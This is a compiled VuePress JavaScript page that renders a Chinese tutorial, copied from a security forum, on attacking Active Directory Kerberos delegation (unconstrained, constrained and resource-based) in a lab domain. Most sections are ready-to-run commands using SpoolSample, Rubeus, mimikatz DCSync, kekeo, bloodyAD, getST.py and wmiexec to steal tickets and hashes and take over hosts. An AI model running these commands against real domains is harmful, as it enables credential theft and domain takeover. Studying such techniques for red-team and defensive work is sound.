import{_ as i}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as l,c as o,a as e,b as a,d as n,e as t,r}from"./app.91785a79.js";const c="/assets/attach-74154d9f099d634217ac41cc85352f6b9f738ec0.fcd8ac55.png",p="/assets/attach-324675e59adb84a87daf687ac63fec088601ae6e.e39cde47.png",d={},u=t(`<h2 id="域委派概念" tabindex="-1"><a class="header-anchor" href="#域委派概念" aria-hidden="true">#</a> 域委派概念</h2><p>委派是一种域内应用模式，是指将域内用户账户的权限委派给服务账号，服务账号因此能以用户的身份在域内展开活动（请求新的服务等）。</p><details class="custom-container details"><summary>委派分类</summary><ul><li>非约束委派(Unconstrained Delegation, UD)</li><li>约束委派(Constrained Delegation, CD)</li><li>基于资源的约束委派(Resource Based Constrained Delegation, RBCD)</li></ul></details><h2 id="非约束委派攻击" tabindex="-1"><a class="header-anchor" href="#非约束委派攻击" aria-hidden="true">#</a> 非约束委派攻击</h2><p>服务账号可以请求得到域内用户的TGT，服务账号使用该TGT模拟域内用户访问任意服务。</p><p>被配置为非约束委托的系统将把TGT（Ticket Granting Ticket）存储到LSASS内存中，以便使用户能够访问终端资源。非约束委派的设置需要SeEnableDelegation权限，一般为管理员具有此权限。</p><p>域控机器账户默认配置非约束性委派。</p><details class="custom-container details"><summary>非约束性委派流程</summary><ol><li>域内用户A经过Kerberos认证后访问WEB服务器</li><li>WEB服务器以服务账户B向KDC请求用户A的可转发票据TGT</li><li>KDC检查B的委派属性，下发TGT</li><li>服务账户B使用TGT向KDC申请服务票据TGS（访问文件服务器等功能）</li><li>KDC检查委派属性和申请的服务，下发TGS</li><li>服务账户使用TGS访问其他服务</li></ol></details><p>1）侦察ADFind</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># ADFind查询非约束委派普通账户</span>
AdFind.exe <span class="token parameter variable">-b</span> <span class="token string">&quot;DC=redteam,DC=lab&quot;</span> <span class="token parameter variable">-f</span> <span class="token string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn

<span class="token comment"># ADFind查询非约束机器账户</span>
AdFind.exe <span class="token parameter variable">-b</span> <span class="token string">&quot;DC=redteam,DC=lab&quot;</span> <span class="token parameter variable">-f</span> <span class="token string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）结合打印机漏洞利用</p><p>强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求。</p>`,12),m={href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noopener noreferrer"},b=t(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 查询打印服务是否开启|域控上查看</span>
sc query spooler

<span class="token comment"># 使用Rubeus监听来自域控的票据</span>
Rubeus.exe monitor /interval:2 /filteruser:DC2016$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),v={href:"https://github.com/leechristensen/SpoolSample",target:"_blank",rel:"noopener noreferrer"},k=t(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 强制回连，获得域控机器账户的TGT</span>
SpoolSample.exe DC2016 WIN7域内主机
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>Rubeus监听到票据并导入该票据</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># rubeus导入票据</span>
Rubeus.exe ptt /ticket:<span class="token operator">&lt;</span>监听到的Ticket<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>使用mimikatz导出Hash</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># mimikatz导出域内用户Hash</span>
mimikatz.exe <span class="token string">&quot;lsadump::dcsync /domain:redteam.lab /user:REDTEAM\\Administrator&quot;</span> <span class="token string">&quot;exit&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后利用此Hash可以远程登陆SMB</p><h2 id="约束性委派攻击" tabindex="-1"><a class="header-anchor" href="#约束性委派攻击" aria-hidden="true">#</a> 约束性委派攻击</h2><p>约束委派通过S4U2Self和S4U2Proxy两个扩展协议限制服务账户只能访问指定服务资源。</p><p>约束委派有两种</p><ol><li>仅使用Kerberos，不能进行协议转换</li><li>使用任何身份验证协议</li></ol><details class="custom-container details"><summary>S4u2self &amp; S4U2proxy</summary><p><code>S4U2self</code>协议允许服务代表任意用户请求访问自身服务的ST服务票据 <code>S4U2proxy</code>协议允许服务在已取得ST服务票据下代表任意用户获取另一个服务的服务票据 约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务。</p><p>配置了约束性委派的账户属性会有如下两个变化：</p><ol><li>账户<code>userAccountControl</code>属性会被设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>标志位，值为<code>16781312</code></li><li>账户的<code>msDS-AllowedToDelegateTo</code>属性，添加允许委派的服务</li></ol></details><p>1）侦察</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># AdFind.exe查询约束委派机器账户</span>
AdFind.exe <span class="token parameter variable">-b</span> <span class="token string">&quot;DC=redteam,DC=lab&quot;</span> <span class="token parameter variable">-f</span> <span class="token string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto

<span class="token comment"># AdFind.exe查询约束委派服务账户</span>
AdFind.exe <span class="token parameter variable">-b</span> <span class="token string">&quot;DC=redteam,DC=lab&quot;</span> <span class="token parameter variable">-f</span> <span class="token string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）使用机器账户的票据 | kekeo</p><p>利用条件：</p><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol>`,16),h={href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noopener noreferrer"},g=e("code",null,"lsass.exe",-1),D=t(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 导出票据</span>
mimikatz.exe <span class="token string">&quot;privilege::debug&quot;</span> <span class="token string">&quot;sekurlsa::tickets /export&quot;</span> <span class="token string">&quot;exit&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+c+`" alt="OHSQfK.png" loading="lazy"></p><p>使用kekeo工具申请服务票据（S4U2Proxy协议）</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 申请服务票据</span>
kekeo.exe <span class="token string">&quot;tgs::s4u /tgt:[0;3e7]-2-1-40e10000-WIN10-1<span class="token variable">$@</span>krbtgt-REDTEAM.LAB.kirbi /user:Administrator@redteam.lab /service:cifs/DC2016.redteam.lab&quot;</span> <span class="token string">&quot;exit&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+p+`" alt="OHS1SO.png" loading="lazy"></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 导入票据</span>
mimikatz.exe <span class="token string">&quot;kerberos::ptt TGS_Administrator@redteam.lab@REDTEAM.LAB_cifs~DC2016.redteam.lab@REDTEAM.LAB.kirbi&quot;</span> <span class="token string">&quot;exit&quot;</span>

<span class="token comment"># 访问</span>
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>DC2016.redteam.lab<span class="token punctuation">\\</span>c$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>3）使用机器账户的Hash值 | kekeo</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 请求票据</span>
kekeo.exe <span class="token string">&quot;tgt::ask /user:WIN10-1$ /domain:redteam.lab /NTLM:8f91f8786d308e62c609688886dc7c4c&quot;</span> <span class="token string">&quot;exit&quot;</span>

<span class="token comment"># 申请administrator权限的票据</span>
kekeo.exe <span class="token string">&quot;tgs::s4u /tgt:TGT_WIN10-1<span class="token variable">$@</span>REDTEAM.LAB_krbtgt~redteam.lab@REDTEAM.LAB.kirbi /user:Administrator@redteam.lab /service:cifs/DC2016.redteam.lab&quot;</span> <span class="token string">&quot;exit&quot;</span>

<span class="token comment"># mimikatz</span>
mimikatz.exe <span class="token string">&quot;kerberos::ptt TGS_Administrator@redteam.lab@REDTEAM.LAB_cifs~DC2016.redteam.lab@REDTEAM.LAB.kirbi&quot;</span> <span class="token string">&quot;exit&quot;</span>

<span class="token comment"># 访问</span>
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>DC2016.redteam.lab<span class="token punctuation">\\</span>c$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="基于资源的约束性委派攻击" tabindex="-1"><a class="header-anchor" href="#基于资源的约束性委派攻击" aria-hidden="true">#</a> 基于资源的约束性委派攻击</h2><p>RBCD主要就是委派的管理移交给服务资源进行控制，其余和约束性委派基本相同。</p><p>:::deatails 配置了RBCD的账户属性变化</p><ul><li>msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户</li></ul><p>可以将基于资源的约束性委派理解为传统的约束性委派的反向过程。以 Service 1 和 Service 2 两个服务为例，传统的约束性委派需要在 Service 1 上设置 <code>msDS-AllowedToDelegateTo</code> 属性，以指定对 Service 2 上的哪一个服务进行委派。而在基于资源的约束性委派中，需要在 Service 2 上将 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性值设为 Service 1 的 SID，以允许 Service 1 对 Service 2 上的服务进行委派。</p><p>此外，在传统的约束性委派中，通过 S4u2self 申请到的 ST 票据一定是可转发的，如果不可转发，则后续的 S4U2Proxy 阶段将失败。但是在基于资源的约束性委派中，不可转发的 ST 票据仍然可以通过 S4U2Proxy 阶段对其他服务进行委派认证。</p><p>:::</p><h3 id="已知acount-operators组用户拿下主机" tabindex="-1"><a class="header-anchor" href="#已知acount-operators组用户拿下主机" aria-hidden="true">#</a> 已知Acount Operators组用户拿下主机</h3><p>Acount Operators组用户可以获得域内除域控的所有主机。</p><p>Acount Operators组成员可以修改<strong>域内任意主机</strong>的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p><details class="custom-container details"><summary>利用条件</summary><ol><li>获取到属于Acount Operators组的用户账户</li><li>可以创建机器账户</li></ol></details><p>1）查询Acount Operators组成员</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>adfind.exe <span class="token parameter variable">-h</span> <span class="token number">10.10</span>.2.20:389 <span class="token parameter variable">-s</span> subtree <span class="token parameter variable">-b</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span><span class="token string">&quot;Account Operators&quot;</span>,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>redteam,DC<span class="token operator">=</span>lab member
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2）创建机器账户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 使用bloodyAD.py创建机器账户</span>
python3 bloodyAD.py <span class="token parameter variable">-d</span> redteam.lab <span class="token parameter variable">-u</span> mark <span class="token parameter variable">-p</span> <span class="token string">&#39;123.com&#39;</span> <span class="token parameter variable">--host</span> <span class="token number">10.10</span>.2.20 addComputer CPT02 <span class="token string">&#39;Passw0rd&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>3）设置委派属性</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 使用PowerView工具查询机器账户SID</span>
powerpick Get-NetComputer CPT02 <span class="token parameter variable">-Properties</span> objectsid
S-1-5-21-3309395417-4108617856-2168433834-1112

<span class="token comment"># 修改服务资源msDS-AllowedToActOnBehalfOfOtherIdentity属性</span>
powerpick <span class="token variable">$SD</span> <span class="token operator">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="token parameter variable">-ArgumentList</span> <span class="token string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1112)&quot;</span><span class="token punctuation">;</span><span class="token variable">$SDBytes</span> <span class="token operator">=</span> New-Object byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token variable">$SD</span>.BinaryLength<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$SD</span>.GetBinaryForm<span class="token punctuation">(</span><span class="token variable">$SDBytes</span>, <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Get-DomainComputer WIN7-1 <span class="token operator">|</span> Set-DomainObject <span class="token parameter variable">-Set</span> @<span class="token punctuation">{</span><span class="token string">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="token operator">=</span><span class="token variable">$SDBytes</span><span class="token punctuation">}</span> <span class="token parameter variable">-Verbose</span>

<span class="token comment"># 查询属性(后一条命令使用到了ActiveDirectory模块，域控默认带)</span>
powerpick Get-DomainComputer WIN7-1 <span class="token parameter variable">-Properties</span> msds-allowedtoactonbehalfofotheridentity

<span class="token comment"># 创建服务票据</span>
python3 getST.py redteam.lab/CPT02$:Passw0rd <span class="token parameter variable">-spn</span> cifs/WIN7-1.redteam.lab <span class="token parameter variable">-impersonate</span> administrator -dc-ip <span class="token number">10.10</span>.2.20

<span class="token comment"># 导入票据</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>/root/Desktop/administrator.ccache

<span class="token comment"># 直接登录</span>
python3 wmiexec.py <span class="token parameter variable">-k</span> redteam.lab/administrator@WIN7-1.redteam.lab -no-pass
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="注意" tabindex="-1"><a class="header-anchor" href="#注意" aria-hidden="true">#</a> 注意</h2>`,26),S={href:"https://forum.butian.net/share/1591%E3%80%82",target:"_blank",rel:"noopener noreferrer"},A=e("p",null,"原作者xigua师傅写的很好，我这直接复制过来备忘了（师傅写的其他文章也很好推荐去看看）。",-1);function f(x,T){const s=r("ExternalLinkIcon");return l(),o("div",null,[u,e("p",null,[a("使用"),e("a",m,[a("Rubeus"),n(s)]),a("工具监听")]),b,e("p",null,[a("使用"),e("a",v,[a("SpoolSample"),n(s)]),a("工具执行打印机漏洞利用，进行强制验证")]),k,e("p",null,[a("使用"),e("a",h,[a("mimikatz"),n(s)]),a("工具导出"),g,a("进程中所有的票据，得到想要的服务票据")]),D,e("p",null,[a("本文内容全部复制自 "),e("a",S,[a("https://forum.butian.net/share/1591。"),n(s)])]),A])}const C=i(d,[["render",f],["__file","委派攻击.html.vue"]]);export{C as default};
